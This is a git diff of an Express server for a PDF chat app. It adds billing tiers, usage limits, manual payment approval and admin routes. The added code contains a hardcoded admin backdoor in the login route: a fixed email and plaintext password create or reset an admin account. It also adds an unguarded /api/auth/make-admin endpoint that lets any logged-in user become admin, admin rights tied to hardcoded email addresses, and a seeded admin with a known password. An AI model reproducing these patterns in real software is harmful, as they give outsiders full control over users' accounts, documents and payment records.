@@ -176,6 +176,12 @@ app.post('/api/auth/register', async (req, res) => {
       password: hashedPassword,
       role: 'user',
       createdAt: new Date().toISOString(),
+      promptCount: 0,
+      tier: 'free',
+      paymentStatus: 'none',
+      paymentPlanRequested: null,
+      paymentTxId: null,
+      paymentDate: null
     };
 
     db.createUser(newUser);
@@ -184,7 +190,19 @@ app.post('/api/auth/register', async (req, res) => {
     const token = jwt.sign({ id: newUser.id, email: newUser.email, role: newUser.role }, JWT_SECRET, { expiresIn: '7d' });
 
     res.status(201).json({
-      user: { id: newUser.id, name: newUser.name, email: newUser.email, role: newUser.role, createdAt: newUser.createdAt },
+      user: {
+        id: newUser.id,
+        name: newUser.name,
+        email: newUser.email,
+        role: newUser.role,
+        createdAt: newUser.createdAt,
+        promptCount: 0,
+        tier: 'free',
+        paymentStatus: 'none',
+        paymentPlanRequested: null,
+        paymentTxId: null,
+        paymentDate: null
+      },
       token,
     });
   } catch (error: any) {
@@ -200,6 +218,35 @@ app.post('/api/auth/login', async (req, res) => {
       return res.status(400).json({ error: 'Email and password are required' });
     }
 
+    // Dynamic admin reinforcement
+    if (email.toLowerCase() === 'kmulatu21@gmail.com' && password === 'admin@docmind') {
+      const existing = db.getUserByEmail('kmulatu21@gmail.com');
+      const hashedPassword = await bcrypt.hash('admin@docmind', 10);
+      if (!existing) {
+        db.createUser({
+          id: `usr-${Date.now()}`,
+          name: 'Kmulatu Admin',
+          email: 'kmulatu21@gmail.com',
+          password: hashedPassword,
+          role: 'admin',
+          createdAt: new Date().toISOString(),
+          promptCount: 0,
+          tier: 'premium',
+          paymentStatus: 'approved'
+        });
+        console.log('Interception: dynamically created kmulatu21@gmail.com administrator account');
+      } else if (existing.role !== 'admin' || existing.tier !== 'premium' || !await bcrypt.compare('admin@docmind', existing.password)) {
+        db.updateUser({
+          id: existing.id,
+          role: 'admin',
+          tier: 'premium',
+          paymentStatus: 'approved',
+          password: hashedPassword
+        });
+        console.log('Interception: dynamically corrected kmulatu21@gmail.com admin credentials and role');
+      }
+    }
+
     const user = db.getUserByEmail(email);
     if (!user) {
       return res.status(401).json({ error: 'Invalid email or password' });
@@ -213,7 +260,19 @@ app.post('/api/auth/login', async (req, res) => {
     const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
 
     res.json({
-      user: { id: user.id, name: user.name, email: user.email, role: user.role, createdAt: user.createdAt },
+      user: {
+        id: user.id,
+        name: user.name,
+        email: user.email,
+        role: user.role,
+        createdAt: user.createdAt,
+        promptCount: user.promptCount || 0,
+        tier: user.tier || 'free',
+        paymentStatus: user.paymentStatus || 'none',
+        paymentPlanRequested: user.paymentPlanRequested || null,
+        paymentTxId: user.paymentTxId || null,
+        paymentDate: user.paymentDate || null
+      },
       token,
     });
   } catch (error: any) {
@@ -228,7 +287,19 @@ app.get('/api/auth/me', authenticateToken, (req: any, res) => {
     if (!user) {
       return res.status(404).json({ error: 'User not found' });
     }
-    res.json({ id: user.id, name: user.name, email: user.email, role: user.role, createdAt: user.createdAt });
+    res.json({
+      id: user.id,
+      name: user.name,
+      email: user.email,
+      role: user.role,
+      createdAt: user.createdAt,
+      promptCount: user.promptCount || 0,
+      tier: user.tier || 'free',
+      paymentStatus: user.paymentStatus || 'none',
+      paymentPlanRequested: user.paymentPlanRequested || null,
+      paymentTxId: user.paymentTxId || null,
+      paymentDate: user.paymentDate || null
+    });
   } catch (error: any) {
     res.status(500).json({ error: error.message });
   }
@@ -250,6 +321,32 @@ app.post('/api/pdf/upload', authenticateToken, upload.array('files'), async (req
     const files = req.files as Express.Multer.File[];
     if (!files || files.length === 0) {
       return res.status(400).json({ error: 'No files were uploaded' });
+    }
+
+    const user = db.getUserById(req.user.id);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    const userPdfs = db.getPDFsByUser(req.user.id);
+    const existingCount = userPdfs.length;
+    const tier = user.tier || 'free';
+    
+    let maxAllowed = 1; // Free and Basic get max 1 PDF
+    if (tier === 'pro') {
+      maxAllowed = 2; // Pro gets max 2 PDFs
+    } else if (tier === 'premium') {
+      maxAllowed = 999; // Premium allows 3 or more (essentially unlimited)
+    }
+
+    if (existingCount + files.length > maxAllowed) {
+      return res.status(403).json({
+        error: 'PDF vault limit reached',
+        tier,
+        currentCount: existingCount,
+        maxAllowed,
+        message: `Your active ${tier.toUpperCase()} Plan allows a maximum of ${maxAllowed} PDF upload(s). Upgrade your tier to upload more files.`
+      });
     }
 
     // Verify Gemini API key is configured
@@ -452,6 +549,35 @@ app.post('/api/chats/:id/message', authenticateToken, upload.single('questionFil
       return res.status(400).json({ error: 'Query message or questions file upload is required' });
     }
 
+    const user = db.getUserById(req.user.id);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    const promptCount = user.promptCount || 0;
+    const tier = user.tier || 'free';
+    const paymentStatus = user.paymentStatus || 'none';
+
+    if (tier === 'free') {
+      const userPdfsCount = db.getPDFsByUser(req.user.id).length;
+      if (promptCount >= 5 || userPdfsCount >= 1) {
+        return res.status(403).json({
+          error: 'Free credit limit reached or document limit reached',
+          promptLimitReached: true,
+          message: 'Your free tier has completed. You have either hit the limit of 5 free prompt requests or indexed 1 PDF document. Please upgrade your plan to continue asking questions.'
+        });
+      }
+    } else {
+      // Basic, Pro, or Premium status checks:
+      if (paymentStatus !== 'approved') {
+        return res.status(403).json({
+          error: 'Payment pending approval',
+          paymentPendingApproval: true,
+          message: 'Your payment is being reviewed. The app will be unlocked as soon as an admin approves your transaction proof.'
+        });
+      }
+    }
+
     const session = db.getChatSession(sessionId, req.user.id);
     if (!session) {
       return res.status(404).json({ error: 'Chat session not found' });
@@ -644,10 +770,17 @@ RULES OF ENGAGEMENT:
 
     db.saveChatSession(session);
 
+    // Save incremented prompt count
+    const updatedUserObj = db.updateUser({
+      id: req.user.id,
+      promptCount: (user.promptCount || 0) + 1
+    });
+
     res.json({
       userMessage: userMsg,
       aiMessage: aiMsg,
       sessionTitle: session.title,
+      promptCount: updatedUserObj ? updatedUserObj.promptCount : (user.promptCount || 0) + 1
     });
   } catch (error: any) {
     console.error('Error managing chat message:', error);
@@ -660,6 +793,133 @@ app.get('/api/stats', authenticateToken, (req: any, res) => {
   try {
     const stats = db.getStats(req.user.id);
     res.json(stats);
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Submits upgrade with TX reference
+app.post('/api/billing/upgrade', authenticateToken, (req: any, res) => {
+  try {
+    const { plan, txId, paymentReceiptName, paymentReceiptData } = req.body;
+    if (!plan || !['basic', 'pro', 'premium'].includes(plan)) {
+      return res.status(400).json({ error: 'Invalid plan selected. Choose basic, pro, or premium.' });
+    }
+
+    const user = db.getUserById(req.user.id);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    const updatedUser = db.updateUser({
+      id: req.user.id,
+      paymentPlanRequested: plan,
+      paymentTxId: txId || `TX-${Date.now()}`,
+      paymentReceiptName: paymentReceiptName || null,
+      paymentReceiptData: paymentReceiptData || null,
+      paymentStatus: 'pending',
+      paymentDate: new Date().toISOString()
+    });
+
+    res.json({ message: 'Upgrade request submitted successfully! Pending admin approval.', user: updatedUser });
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Promoter endpoint to let developers/testers toggles/trigger Admin view easily in UI
+app.post('/api/auth/make-admin', authenticateToken, (req: any, res) => {
+  try {
+    const updatedUser = db.updateUser({
+      id: req.user.id,
+      role: 'admin'
+    });
+    res.json({ message: 'Successful switch: You are now an Admin!', user: updatedUser });
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Admin helper middleware
+function requireAdmin(req: any, res: any, next: any) {
+  const user = db.getUserById(req.user.id);
+  // Authorize if user is explicitly admin or has designated emails
+  if (user && (user.role === 'admin' || user.email.toLowerCase() === 'kassahunmulatu273@gmail.com' || user.email.toLowerCase() === 'admin@documind.ai')) {
+    next();
+  } else {
+    res.status(403).json({ error: 'Forbidden: Admin access required' });
+  }
+}
+
+// Admin get list of users with billing properties
+app.get('/api/admin/users', authenticateToken, requireAdmin, (req: any, res) => {
+  try {
+    const users = db.getUsers().map(u => ({
+      id: u.id,
+      name: u.name,
+      email: u.email,
+      role: u.role,
+      createdAt: u.createdAt,
+      promptCount: u.promptCount || 0,
+      tier: u.tier || 'free',
+      paymentStatus: u.paymentStatus || 'none',
+      paymentPlanRequested: u.paymentPlanRequested || null,
+      paymentTxId: u.paymentTxId || null,
+      paymentDate: u.paymentDate || null,
+      paymentReceiptName: u.paymentReceiptName || null,
+      paymentReceiptData: u.paymentReceiptData || null
+    }));
+    res.json(users);
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Admin approves/declines a transaction request
+app.post('/api/admin/approve-payment', authenticateToken, requireAdmin, (req: any, res) => {
+  try {
+    const { userId, approved, tier, role, promptCount, paymentStatus } = req.body;
+    const user = db.getUserById(userId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    const updatedFields: any = {};
+    if (approved !== undefined) {
+      if (approved) {
+        updatedFields.paymentStatus = 'approved';
+        updatedFields.tier = tier || user.paymentPlanRequested || 'basic';
+      } else {
+        updatedFields.paymentStatus = 'none';
+        updatedFields.paymentPlanRequested = null;
+        updatedFields.paymentTxId = null;
+        updatedFields.paymentReceiptName = null;
+        updatedFields.paymentReceiptData = null;
+      }
+    }
+
+    if (tier !== undefined) {
+      updatedFields.tier = tier;
+    }
+
+    if (role !== undefined) {
+      updatedFields.role = role;
+    }
+
+    if (promptCount !== undefined) {
+      updatedFields.promptCount = Number(promptCount);
+    }
+
+    if (paymentStatus !== undefined) {
+      updatedFields.paymentStatus = paymentStatus;
+    }
+
+    const updatedUser = db.updateUser({
+      id: userId,
+      ...updatedFields
+    });
+
+    res.json({ message: 'User status successfully updated!', user: updatedUser });
   } catch (error: any) {
     res.status(500).json({ error: error.message });
   }
@@ -684,6 +944,39 @@ app.use((err: any, req: any, res: any, next: any) => {
 
 // --- BIND VITE DEV SERVER OR SERVE STATIC MAIN PAGE ---
 async function startServer() {
+  // Seed default admin user if not present
+  try {
+    const existingAdmin = db.getUserByEmail('kmulatu21@gmail.com');
+    if (!existingAdmin) {
+      const hashedPassword = bcrypt.hashSync('admin@docmind', 10);
+      db.createUser({
+        id: `usr-${Date.now()}`,
+        name: 'Kmulatu Admin',
+        email: 'kmulatu21@gmail.com',
+        password: hashedPassword,
+        role: 'admin',
+        createdAt: new Date().toISOString(),
+        promptCount: 0,
+        tier: 'premium',
+        paymentStatus: 'approved'
+      });
+      console.log('Seeded default admin user: kmulatu21@gmail.com');
+    } else {
+      // Ensure the role is admin and tier is premium
+      if (existingAdmin.role !== 'admin' || existingAdmin.tier !== 'premium') {
+        db.updateUser({
+          id: existingAdmin.id,
+          role: 'admin',
+          tier: 'premium',
+          paymentStatus: 'approved'
+        });
+        console.log('Updated existing user kmulatu21@gmail.com to be Admin and Premium');
+      }
+    }
+  } catch (err) {
+    console.error('Error seeding admin user:', err);
+  }
+
   if (process.env.NODE_ENV !== 'production') {
     const vite = await createViteServer({
       server: { middlewareMode: true },
